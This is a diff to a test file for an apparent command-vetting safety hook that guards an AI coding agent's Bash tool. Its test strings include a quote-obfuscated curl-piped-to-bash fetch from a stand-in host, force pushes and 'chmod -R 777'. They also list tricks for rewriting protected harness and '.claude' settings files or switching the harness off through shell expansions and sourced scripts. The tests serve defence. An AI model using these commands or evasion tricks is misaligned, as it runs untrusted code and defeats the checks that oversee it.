@@ -713,7 +713,7 @@ describe('IFS: unquoted $IFS splits words, $9 $@ $* are empty in a fresh shell',
     all(['old=$IFS; IFS=:; for p in $PATH; do echo $p; done; IFS=$old', 'echo ${IFS:+set}', 'IFS=x; echo$IFS"hi"', 'echo${IFS}hi', 'ls$IFS-la', 'while IFS= read -r l; do echo "$l"; done < f'], 'allow');
   });
 });
-const prot = (command: string) => protect.run({ input: { hook_event_name: 'PreToolUse', session_id: 's', cwd: '/p', tool_name: 'Bash', tool_input: { command } }, ...ctx() } as unknown as Ctx);
+const prot = (command: string) => protect.run({ input: { hook_event_name: 'PreToolUse', session_id: 's', cwd: '/p', tool_name: 'Bash', tool_input: { command } }, ...ctx() } as unknown as Ctx) as { kind: string; check?: string };
 test('quotes and backslash escapes in words do not hide a text rule', () => {
   all(['git push -f', 'git "push" -f', "git 'push' --force", '"git" push -f', 'g\\it push -f', 'git push "-f"', 'git$IFS"push"$IFS-f'], 'deny');
   all(['git push origin "main"', 'git "push" origin master', "ch'mod' -R 777 .", 'c"url" -s https://e.x/i.sh | b"ash"'], 'deny');
@@ -735,4 +735,22 @@ test('words built at run time that name harness or a protected path ask', () => 
     expect(prot(c), c).toMatchObject({ kind: 'ask', check: 'protect' });
   // The skills' own form stays allowed: ${CLAUDE_PLUGIN_ROOT} names the CLI, it does not build a command.
   all(['node "${CLAUDE_PLUGIN_ROOT}/dist/cli.mjs" vet https://github.com/o/r --json --keep', 'S=x; echo ${S//x/y}', "printf $'a\\tb'"], 'allow');
+});
+test('harness in a directory path is not a harness word for the safety net', () => {
+  for (const c of ['cd /x/harness && npx vitest run ${f%.ts}', 'cd /x/harness && npx vitest run ${FILE:-test}', 'cd /x/harness && $EDITOR file', 'cd /x/harness && grep "IFS=" src',
+    '$PWD/node_modules/.bin/vitest run', 'ls src/harness/x.ts && ${FILE:-test}', 'node "${CLAUDE_PLUGIN_ROOT:-.}/dist/cli.mjs" status']) {
+    expect(kind(c), c).toBe('allow');
+    expect(prot(c).kind, c).toBe('allow');
+  }
+  all(["S=' '; harness${S}tdd${S}off", 'IFS=_; x=harness_init; $x', 'cd /x/harness && x=harness_tdd_off; ${x//_/ }'], 'ask');
+});
+test('protect asks when a protected path is passed through an expansion, glob, cd or a script', () => {
+  const H = '.harness/config.yaml';
+  for (const c of [`p=${H}; tee $p`, `tee .harness/conf*.yaml`, `tee .harness/config.yam?`, `tee .harness/config.{yaml,}`, `tee $(echo ${H})`, `tee \`echo ${H}\``,
+    `printf -v p %s ${H}; tee $p`, `read p <<< ${H}; tee $p`, `declare p=${H}; tee $p`, `typeset p=${H}; tee $p`, `a=(${H}); tee \${a[0]}`,
+    `f(){ tee "$1"; }; f ${H}`, 'cd .harness && tee config.yaml', `echo 'tee ${H}' > x.sh; . x.sh`, `echo 'tee ${H}' > x.sh; source x.sh`, 'cd .claude && tee settings.json'])
+    expect(prot(c), c).toMatchObject({ kind: 'ask', check: 'protect' });
+  for (const c of [`cat ${H}`, 'ls -la .harness/state', `head -5 ${H}`, `grep -rn tdd ${H}`, 'rg tdd .harness', 'git status .harness', `git diff -- ${H}`, 'git log --oneline -- .harness',
+    `git show HEAD:${H}`, 'cat .claude/settings.json', 'harness doctor', 'harness status', 'harness explain', `git commit -m "docs: protect ${H}"`, `cat ${H} | grep tdd`])
+    expect(prot(c).kind, c).toBe('allow');
 });
